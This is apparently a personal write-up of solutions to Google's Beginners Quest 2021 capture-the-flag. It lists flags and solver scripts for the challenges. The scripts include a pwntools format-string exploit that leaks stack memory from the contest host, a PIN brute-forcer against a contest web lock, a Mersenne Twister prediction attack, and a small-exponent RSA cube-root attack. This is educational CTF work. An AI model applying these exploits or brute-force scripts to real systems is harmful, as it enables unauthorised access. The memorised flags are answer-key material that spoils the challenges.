# Google Beginners Quest 2021

[[https://capturetheflag.withgoogle.com/beginners-quest](https://capturetheflag.withgoogle.com/beginners-quest) , 2021 site]

1.  password : GoodPassword
    1. **CTF{IJustHopeThisIsNotOnShodan}**
2.  Just take it on paper and do it
    
    ![Untitled](Google%20Beginners%20Quest%202021%20c55d400211444428bf3faba7810ab9b2/Untitled.png)
    
    sooo. **CTF{BCFIJ}**
    
3. 
    
    ```jsx
    maxim = Math.max(...scanArray);
    
    max_i = scanArray.indexOf(maxim);
    console.log(max_i);
    
    if(maxim == scanArray[8] && maxim == scanArray[7] && maxim == scanArray[9])
       return 0;
    
    if(max_i < 8){
       return -1;
    }
    else if(max_i > 8){
       return 1;
    }
    return 1;
    ```
    
    **CTF{cbe138a2cd7bd97ab726ebd67e3b7126707f3e7f}**
    
4. basically, we turn bits on and off and that gives us some chars, a little pyton script does the trick  
    
    **CTF{be65dfa2355e5309808a7720a615bca8c82a13d7}**
    
    - Code
        
        ```jsx
        gpio = 0
        
        def gpio_set_mask(mask):
        	global gpio
        	gpio = gpio | mask
        
        def gpio_clr_mask(mask):
        	global gpio
        	gpio = gpio & ~mask
        	
        def sleep_us(us):
        	print(chr(gpio),end="")
        
        gpio_set_mask(67)
        gpio_clr_mask(0)
        sleep_us(100)
        gpio_set_mask(20)
        gpio_clr_mask(3)
        sleep_us(100)
        gpio_set_mask(2)
        gpio_clr_mask(16)
        sleep_us(100)
        gpio_set_mask(57)
        gpio_clr_mask(4)
        sleep_us(100)
        gpio_set_mask(0)
        gpio_clr_mask(25)
        sleep_us(100)
        gpio_set_mask(5)
        gpio_clr_mask(2)
        sleep_us(100)
        gpio_set_mask(18)
        gpio_clr_mask(65)
        sleep_us(100)
        gpio_set_mask(1)
        gpio_clr_mask(2)
        sleep_us(100)
        gpio_set_mask(64)
        gpio_clr_mask(17)
        sleep_us(100)
        gpio_set_mask(2)
        gpio_clr_mask(0)
        sleep_us(100)
        gpio_set_mask(1)
        gpio_clr_mask(6)
        sleep_us(100)
        gpio_set_mask(18)
        gpio_clr_mask(65)
        sleep_us(100)
        gpio_set_mask(1)
        gpio_clr_mask(0)
        sleep_us(100)
        gpio_set_mask(4)
        gpio_clr_mask(2)
        sleep_us(100)
        gpio_set_mask(0)
        gpio_clr_mask(0)
        sleep_us(100)
        gpio_set_mask(64)
        gpio_clr_mask(16)
        sleep_us(100)
        gpio_set_mask(16)
        gpio_clr_mask(64)
        sleep_us(100)
        gpio_set_mask(2)
        gpio_clr_mask(4)
        sleep_us(100)
        gpio_set_mask(0)
        gpio_clr_mask(3)
        sleep_us(100)
        gpio_set_mask(9)
        gpio_clr_mask(0)
        sleep_us(100)
        gpio_set_mask(0)
        gpio_clr_mask(1)
        sleep_us(100)
        gpio_set_mask(0)
        gpio_clr_mask(8)
        sleep_us(100)
        gpio_set_mask(8)
        gpio_clr_mask(0)
        sleep_us(100)
        gpio_set_mask(65)
        gpio_clr_mask(24)
        sleep_us(100)
        gpio_set_mask(22)
        gpio_clr_mask(64)
        sleep_us(100)
        gpio_set_mask(0)
        gpio_clr_mask(0)
        sleep_us(100)
        gpio_set_mask(0)
        gpio_clr_mask(5)
        sleep_us(100)
        gpio_set_mask(0)
        gpio_clr_mask(2)
        sleep_us(100)
        gpio_set_mask(65)
        gpio_clr_mask(16)
        sleep_us(100)
        gpio_set_mask(22)
        gpio_clr_mask(65)
        sleep_us(100)
        gpio_set_mask(1)
        gpio_clr_mask(6)
        sleep_us(100)
        gpio_set_mask(4)
        gpio_clr_mask(0)
        sleep_us(100)
        gpio_set_mask(66)
        gpio_clr_mask(21)
        sleep_us(100)
        gpio_set_mask(1)
        gpio_clr_mask(0)
        sleep_us(100)
        gpio_set_mask(0)
        gpio_clr_mask(2)
        sleep_us(100)
        gpio_set_mask(24)
        gpio_clr_mask(65)
        sleep_us(100)
        gpio_set_mask(67)
        gpio_clr_mask(24)
        sleep_us(100)
        gpio_set_mask(24)
        gpio_clr_mask(67)
        sleep_us(100)
        gpio_set_mask(2)
        gpio_clr_mask(8)
        sleep_us(100)
        gpio_set_mask(65)
        gpio_clr_mask(18)
        sleep_us(100)
        gpio_set_mask(16)
        gpio_clr_mask(64)
        sleep_us(100)
        gpio_set_mask(2)
        gpio_clr_mask(0)
        sleep_us(100)
        gpio_set_mask(68)
        gpio_clr_mask(19)
        sleep_us(100)
        gpio_set_mask(19)
        gpio_clr_mask(64)
        sleep_us(100)
        gpio_set_mask(72)
        gpio_clr_mask(2)
        sleep_us(100)
        gpio_set_mask(2)
        gpio_clr_mask(117)
        sleep_us(100)
        ```
        
5. Its a predictible prng attack, if you search for the implementation you will eventually get to this page: [https://docs.python.org/3/library/random.html#:~:text=supplied with the-,MersenneTwister,-generator and some](https://docs.python.org/3/library/random.html#:~:text=supplied%20with%20the-,MersenneTwister,-generator%20and%20some)
    
    then we try to search for “MersenneTwister predict” and then we struck gold : [https://github.com/kmyk/mersenne-twister-predictor#:~:text=Mersenne Twister Predictor-,Predict MT19937 PRNG%2C from preceding 624 generated numbers,-. There is a](https://github.com/kmyk/mersenne-twister-predictor#:~:text=Mersenne%20Twister%20Predictor-,Predict%20MT19937%20PRNG%2C%20from%20preceding%20624%20generated%20numbers,-.%20There%20is%20a)
    
    then it’s only a simple script to reveal the used key 
    
    ```jsx
    import nums 
    from mtpred import MT19937Predictor
    predictor = MT19937Predictor()
    
    for num in nums.nums:
        predictor.setrandbits(num - (1<<31), 32)
    
    secret = open('secret.enc', 'rb').read()
    key = [predictor.getrandbits(8) for i in range(len(secret))]
    print("".join([chr(a^b) for a,b in zip(key,list(secret))]))
    ```
    
6. A long one ahead
    - first, the chall.txt is a uni65536, more guessing than concrete skill, [https://www.better-converter.com/Encoders-Decoders/Base65536-Decode](https://www.better-converter.com/Encoders-Decoders/Base65536-Decode)
    - that gives us a picture by piet, which artist is a code written in evil [https://tio.run/#evil](https://tio.run/#evil)
    - after this, we get a zlib compressed and then a glip compressed
    - after this we get a netpbm image, which is a piet code, how the fuck do we run this?
    - we go to this site [https://www.bertnase.de/npiet/npiet-execute.php](https://www.bertnase.de/npiet/npiet-execute.php) (be sure to use the netpbm image here, png wont work)
    - we get a zlib that then gets us to this bad cat [https://esolangs.org/wiki/Nya~](https://esolangs.org/wiki/Nya~)
    - we make a little interpreter
        - code
            
            ```jsx
            for line in nya:
             	print(chr(len(line)-4), end="")
            ```
            
    - idk how we were supposed to figure this out, but the last language is “Unary” [[https://esolangs.org/wiki/unary](https://esolangs.org/wiki/unary)] and out number from the script written in binary, gives us a unary set of instructions, which when translated are brain fuck
        - code
            
            ```jsx
            translate = {
            	"000":">",
            	"001":"<",
            	"010":"+",
            	"011":"-",
            	"100":".",
            	"101":",",
            	"110":"[",
            	"111":"]"
            }
            
            for i in range(0,len(ins),3):
            	print(translate[ins[i:i+3]], end="")
            ```
            
        
        finally it’s brainfuck, and we just run it and get the flag
        
    
    **CTF{pl34s3_n0_m04r}**
    
7. look on wiki, we need to calculate the cube root and then the flag shows
    - I thought i could solve this, until i couldn’t
    - you need to search RSA on wiki, and the first attack shows a small e can lead to an attacker just calculating the cube root
    - now, you need to add n to the c until the cube root contains a CTF, the code look something like this
    - 
    - Code
        
        ```python
        from Crypto.Util.number import *
        
        c = 15478048932253023588842854432571029804744949209594765981036255304813254166907810390192307350179797882093083784426352342087386691689161026226569013804504365566204100805862352164561719654280948792015789195399733700259059935680481573899984998394415788262265875692091207614378805150701529546742392550951341185298005693491963903543935069284550225309898331197615201102487312122192298599020216776805409980803971858120342903012970709061841713605643921523217733499022158425449427449899738610289476607420350484142468536513735888550288469210058284022654492024363192602734200593501660208945967931790414578623472262181672206606709
        n = 21034814455172467787319632067588541051616978031477984909593707891829600195022041640200088624987623056713604514239406145871910044808006741636513624835862657042742260288941962019533183418661144639940608960169440421588092324928046033370735375447302576018460809597788053566456538713152022888984084306297869362373871810139948930387868426850576062496427583397660227337178607544043400076287217521751017970956067448273578322298078706011759257235310210160153287198740097954054080553667336498134630979908988858940173520975701311654172499116958019179004876438417238730801165613806576140914402525031242813240005791376093215124477
        
        # inverse = 7011604818390822595773210689196180350538992677159328303197902630609866731674013880066696208329207685571201504746468715290636681602668913878837874945287552347580753429647320673177727806220381546646869653389813473862697441642682011123578458482434192006153603199262684522152179571050674296328028102099289787457957270046649643462622808950192020832142527799220075779059535848014466692095739173917005990318689149424526107432692902003919752411770070053384429066246699318018026851222445499378210326636329619646724506991900437218057499705652673059668292146139079576933721871268858713638134175010414271080001930458697738374826
        
        # m = pow(c,inverse,n)
        def nth_root(x, n=3):
            # Start with some reasonable bounds around the nth root.
            upper_bound = 1
            while upper_bound ** n <= x:
                upper_bound *= 2
            lower_bound = upper_bound // 2
            # Keep searching for a better result as long as the bounds make sense.
            while lower_bound < upper_bound:
                mid = (lower_bound + upper_bound) // 2
                mid_nth = mid ** n
                if lower_bound < mid and mid_nth < x:
                    lower_bound = mid
                elif upper_bound > mid and mid_nth > x:
                    upper_bound = mid
                else:
                    # Found perfect nth root.
                    return mid
            return mid + 1
        
        for k in range(1000,2000):
          res = nth_root(c+k*n,3)
          l = hex(res)[2:] #remove the 0x
          # if len(l) %2 ==1:
          #   l = "0"+l
          m=b""
          try:
            m = b''.fromhex(l)
          except:
            pass
          if b'CTF' in m:
            print(l)
            print(k)
            print(m)
            break
        ```
        
    - - **CTF{34sy_RS4_1s_e4sy_us3}**
8. This one is really awesome
    - we observe there is no image, we can still try to upload the image on some steg solver sites, but we quickly see that the format is corrupt
    - so then, we go on wiki to see how the png format is defined
    - it’s fairly simple, length,header,data,crc, we can use a quick script to go over all the bytes
    - code
        
        ```python
        import struct
        
        data = open("hideandseek.png", "rb").read()[8:]
        
        i = 0
        while i < len(data):
        	chunkLength = struct.unpack(">I", data[i:i+4])[0]
        	chunkType = data[i+4:i+8]
        	chunkData = data[i+8:i+8+chunkLength]
        	crc = data[i+8+chunkLength:i+12+chunkLength]
        	i+=12+chunkLength
        	if chunkType == b'eDIH':
        		print(chunkData.decode(),end="")
        ```
        
    - going through the chunk types, we see a eDIH type, which doesn’t exist on the wiki page, also is ‘HIDe’ spelled backwards,
    - each data block is just 1 in length, so we put them together
    - at the and we get a base64 encoded strign which is our flag
    - **CTF{DidYouKnowPNGisPronouncedPING?}**
        - I dont believe it for a second tho
9. CTF{SB:575756}, meh strings, but i’d like to solve it looking in the java code
10. 
11.  This is called a format string exploit : [https://web.ecs.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf](https://web.ecs.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf)
     - if we analyze **the** pseudocode in IDA, we find the jewel “print(d)” where d is our input, we can exploit this
     - code
        
        ```python
        from pwn import *
        
        conn = remote('pwn-notebook.2021.ctfcompetition.com', 1337)
        
        print(conn.recv())
        print(conn.recv())
        
        conn.send(b'3\n')
        
        conn.recv(timeout=1)
        for i in range(2000):
            cmdin = "%{0}$llx \n".format(i).encode() # it works if we dont put th 'll' as well, but the chunks are smaller
            conn.send(cmdin)
            lines = conn.recv(timeout=1).splitlines()
            if(len(lines)>2):
                print("|",end="") 
                try:
                    print(b''.fromhex(lines[1][1:-1].strip().decode('utf-8')).decode(),end="")
                except:
                    print("?",end="")
                print("|")
        conn.close()
        ```
        
     - i hate pwn tools, it doesn’t make sense to me YET, but if we run it, we get this at one time
     - 
            ```jsx
            |imeR|
            |TC :redn|
            |tamrof{F|
            |_gnirts_|
            |_eht_rof|
            |}niw|
            ```
            
        - it’s backwards, maybe in little endian(it can be solved if we [::-1] the decode), but we can make sense of it →
     - **CTF{format_string_for_the_win}**
12. easy one
    - we see that some of the numbers are grayed out
    - then a simple script tries all of them
    - code
    - ```python
        import requests
        from itertools import permutations
        
        url = 'https://old-lock-web.2021.ctfcompetition.com/'
        
        # set form data
        form_data = {
            'v':'12345'
        }
        
        vals = [3,5,7,8,0]
        pins = list(permutations(vals,5))
        
        for i in pins:
            res = requests.post(url, data={'v':''.join(str(x) for x in i)})
            print(''.join(str(x) for x in i))
            if 'Hmm no, that\'s not it...' not in res.text:
                print(i)
                print(res.text)
            ```
                
        - **CTF{IThinkWeNeedToReplaceTheKeypad}**
13. This one is easy too, we get a wireshark network log,
    - we look through it and we find a zip file
    - we download it and it requires a password
    - if we contien to look, we see a html page
    - we put it in a file and we jave all kings of functions like
        ```jsx
        function encryptWithMilitaryGradeEncryption(text) 
        function decryptWithMilitaryGradeEncryption(hexstr)
        ```
    - then we see some websocket action, messages
        
        ```jsx
        {"militaryGradeEncryption":false,"codename":"BadGuy87","message":"which zip file?"}
        
        {"militaryGradeEncryption":false,"codename":"BadGuy87","message":"oh, that one... gimme a sec, need to turn on military grade encryption"}
        
        {"militaryGradeEncryption":true,"codename":"BadGuy87","message":"717f510b44623d391016bd6464450c5e316d1a0c16b95f794d487a2719373000be4a54445843273f080216b97c795348642d19300a169d627a4d645634280c0c21a53a241218"}
        
        {"militaryGradeEncryption":true,"codename":"BadGuy87","message":"72734044"}
        ```
        
        - of course, we see that the encryption is some king of variaction which reuses a key as long as the text has len, that is already bad, but we can just copy the function in a new file and use them to decrupt the third message
        - code(expand)
            
            ```jsx
            function toHex(n) {
              return (n >> 4).toString(16) + (n & 0xf).toString(16);
            }
            function encryptWithMilitaryGradeEncryption(text) {
              const encoder = new TextEncoder();
              const encoded = encoder.encode(text);
              const len = encoded.length;
            
              const key = Uint8Array.from([11, 22, 33, 44, 55, 66, 77, 88, 99, 101, 202]);
              const keylen = key.length;
            
              let hexstr = "";
            
              for (let i = 0; i < len; i++) {
                hexstr += toHex(encoded[i] ^ key[i % keylen]);
              }
            
              return hexstr;
            }
            
            function decryptWithMilitaryGradeEncryption(hexstr) {
              const len = hexstr.length;
            
              const key = Uint8Array.from([11, 22, 33, 44, 55, 66, 77, 88, 99, 101, 202]);
              const keylen = key.length;
            
              const arr = [];
            
              for (let i = 0; i < len; i += 2) {
                const byte = parseInt(hexstr.substring(i, i + 2), 16);
                arr.push(byte ^ key[(i >> 1) % keylen]);
              }
            
              const decoder = new TextDecoder();
              return decoder.decode(Uint8Array.from(arr));
            }
            
            console.log(
              decryptWithMilitaryGradeEncryption(
                "717f510b44623d391016bd6464450c5e316d1a0c16b95f794d487a2719373000be4a54445843273f080216b97c795348642d19300a169d627a4d645634280c0c21a53a241218"
              )
            );
            ```
            
        - the message is
        
        ```jsx
        zip's password is BossToldMeToSetABetterPasswordSoThisWillHaveToDo1234
        ```
        
        - it works then we get a flag.txt which is out flag
        - **CTF{PleaseAssumeThisIsSomeSecretStuffThankYou}**

14. Reverse a pascal code? ooof
    - this one is kind of fun, it’s just bits operation, we can work them backwords and then we get the flag
    - code

        ```python
            def rotateBits(x,i):#we simulate the operations
            	return (x<<i)|(x>>(64-i))
            
            def rotateBitsR(x,i):
            	return (x>>i)|(x<<(64-i))
            
            def check_pin(x):# this is just the program from pascal
            	x ^= 0o1275437152437512431354
            	x = rotateBits(x,10)
            
            	a = x & 1229782938247303441
            	b = x & 0o0210421042104210421042
            	c = x & rotateBits(1229782938247303441,2)
            	d = x & rotateBits(0o0210421042104210421042,2)
            
            	if a == 0x0100101000011110 and \
            		b == 0x2002220020022220 and \
            		c == 0x4444040044044400 and \
            		d ==0x8880008080000880:
            		print(x)
            
            res = 0
            #we can reverse the operations, we take the expected valeus from a,b,c,d and just 
            # 'and' them with the operand
            # by doing 'or' on them, we are sure that our res will respect those
            # criterias and the check will work
            # after that, the first two ops from check_pin are reversable, and there is the code
            res |= 1229782938247303441 & 0x0100101000011110
            res |= 0o0210421042104210421042 & 0x2002220020022220
            res |= rotateBits(1229782938247303441,2) & 0x4444040044044400
            res |=  rotateBits(0o0210421042104210421042,2) & 0x8880008080000880
            
            res = rotateBitsR(res,10)
            res = res^0o1275437152437512431354
            
            print(hex(res)[2:][::-1])
            ```
            
    - the output is longer, but i did just assumed its the first 16 digits
    - **CTF{3333319552798534}**
  1. Its kind of a new kind of challange, we need to make a code small
        
        ```python
        from struct import *
        b=bytes
        r=range
        n=[x for x in r(2,9999) if all(x%y for y in r(2,x))]
        a=b(r(65,91))
        def encode(i):
          return b(x^(y&0xff) for x,y in zip(b"BEGN\0\0\0\x1a"+a.lower()+b"DATA"+pack(">I",len(i))+i+b"END.\0\0\0\x1a"+a,n))
        #END
        ```
        
        - this is it, the tricky part is to put the ‘\0\0\0\x1a’ at the end, it just bearly gives you one or two bytes, but this is what is needed to get the flag (because packt doesnt really make sense if we already know the data we want to put in)
        - **CTF{EncodingSuccessfulIntelReceivedCorrectly}**